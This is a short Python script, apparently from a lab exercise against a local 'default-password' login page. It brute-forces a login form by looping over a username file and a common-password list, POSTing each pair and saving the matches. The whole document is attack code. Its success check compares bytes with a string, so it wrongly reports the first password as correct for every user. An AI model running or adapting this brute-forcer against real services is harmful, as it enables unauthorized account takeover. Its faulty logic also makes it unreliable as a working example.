import requests


def brute(login, passw):
    payload = {'login': login, 'password': passw}
    response = requests.post('http://localhost/default-password/login.php', data=payload)
    return response.content != 'Wrong pass!'


val_name = open('output_lists/logins', 'r').readlines()
passwords = open('input_lists/twitter-banned.txt', 'r').readlines()
fw = open('output_lists/logins_and_pass', 'a')
for name in val_name:
    print ('perebirayem dlya ' + name)
    for password in passwords:
        if brute(name.strip(), password.strip()):
            print ('nayden dlya ' + name)
            fw.write(name.strip() + ' ' + password)
            break
fw.close()
